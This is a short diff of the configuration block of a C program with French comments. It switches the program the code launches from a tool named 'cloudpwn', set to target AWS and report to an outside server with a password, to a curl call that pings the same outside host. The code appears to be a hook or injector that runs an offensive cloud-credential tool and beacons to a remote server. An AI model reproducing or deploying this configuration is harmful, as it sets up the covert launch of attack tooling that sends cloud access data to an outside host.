@@ -9,8 +9,8 @@
 // ============================================
 // CONFIGURATION - À MODIFIER AVANT COMPILATION
 // ============================================
-#define PROGRAM_TO_LAUNCH "/cloudpwn"
-#define PROGRAM_ARGS "cloudpwn --cloud aws --server https://docean.shoxxdj.fr --password toto"  // Arguments séparés par des espaces (le premier doit être le nom du programme)
+#define PROGRAM_TO_LAUNCH "/usr/bin/curl"
+#define PROGRAM_ARGS "curl https://docean.shoxxdj.fr/testX"  // Arguments séparés par des espaces (le premier doit être le nom du programme)
 // ============================================
 
 // Variable pour éviter la récursion
